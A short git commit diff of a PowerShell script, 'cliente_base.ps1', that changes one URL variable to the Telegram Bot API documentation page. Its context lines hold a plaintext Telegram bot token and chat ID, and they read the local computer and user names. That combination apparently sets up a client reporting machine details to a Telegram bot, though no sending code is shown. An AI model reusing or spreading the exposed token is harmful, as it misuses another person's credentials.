100022fe862bdb0a1752c3db665cc96ab5fd81c9
joe2sc712-beep <joe2sc712@gmail.com>
2026-06-19 18:01:33 -0300

    cliente_base.ps1

--- cliente_base.ps1
+++ cliente_base.ps1
@@ -4,7 +4,7 @@
 $Token  = "8935867266:AAELjvUiJRXauSgYmmHAMmut-SOJWXyYImg"
 $ChatID = "1018796719"
 
-$URL    = "https://telegram.org"
+$URL    = "https://core.telegram.org/bots/api"
 $MiPC   = $env:COMPUTERNAME
 $User   = $env:USERNAME
 
